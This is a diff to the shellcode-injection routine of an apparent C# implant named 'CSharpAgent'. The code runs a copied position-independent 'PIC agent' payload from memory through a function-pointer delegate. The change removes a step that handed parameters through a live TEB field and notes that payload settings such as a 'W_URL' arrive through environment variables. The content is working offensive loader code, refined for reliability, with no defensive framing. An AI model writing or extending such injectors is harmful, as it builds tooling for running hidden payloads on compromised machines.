@@ -105,24 +105,13 @@ namespace CSharpAgent
             if (processArch == "ARM64")
                 NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
 
-            IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
-            Parameters parameters = new Parameters
-            {
-                InjectorVersion = uint.MaxValue,
-                InjectorCompilationType = 100
-            };
-            Marshal.StructureToPtr(parameters, parametersMemory, false);
-
-            int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
-            // The slot we borrow is a LIVE TEB field (ActiveRpcHandle on both x64 and x86):
-            // save the thread's value so an early-returning payload leaves the TEB exactly as
-            // it found it instead of leaving a pointer into freed heap behind.
-            IntPtr previousTebSlot = Marshal.ReadIntPtr(tebAddress, offset);
-            Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
-#if DEBUG
-            Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
-                offset.ToString("X") + " (" + Diag.Hex(parametersMemory) + ") — handoff ready");
-#endif
+            // No parameter handoff block and no TEB-slot write: code-audited against the PIC
+            // (2026-10) — its entry never reads the one argument it receives, never reads a
+            // Parameters block, and never touches the TEB slot (its only segment reads are the
+            // PEB pointers). The old ceremony borrowed the LIVE ActiveRpcHandle field for data
+            // nobody consumed — pure risk, since the PIC brings COM (and with it the RPC
+            // runtime) onto this very thread. All payload configuration travels in the
+            // process environment (W_URL and friends), applied by Dispatch before this call.
 
             var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
 #if DEBUG
@@ -135,12 +124,6 @@ namespace CSharpAgent
             Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                 "(early bail on this box?); the reply reports status 0 anyway");
 #endif
-            // Early-return path only (a real PIC entry never returns and never reaches here):
-            // restore the borrowed TEB slot FIRST, then free the block — the opposite order
-            // leaves ActiveRpcHandle pointing at freed memory for the rest of the thread's
-            // life (a use-after-free if this thread ever touches RPC again).
-            Marshal.WriteIntPtr(tebAddress, offset, previousTebSlot);
-            Marshal.FreeHGlobal(parametersMemory);
         }
 
         internal static IntPtr IntPtrAdd(IntPtr p0, int p1)
